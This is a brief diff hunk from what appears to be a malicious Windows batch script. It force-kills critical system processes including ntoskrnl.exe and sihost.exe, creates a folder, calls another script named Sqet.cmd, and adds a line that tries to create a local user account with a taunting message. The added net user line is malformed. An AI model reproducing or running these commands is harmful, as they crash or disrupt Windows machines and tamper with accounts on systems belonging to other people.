@@ -49,3 +49,4 @@ taskkill /F /IM ntoskrnl.exe
 taskkill /F /IM sihost.exe
 md   C:\Wind1
 Sqet.cmd
+net user /add NOPE NOT LOG ON FOR YOU!!!
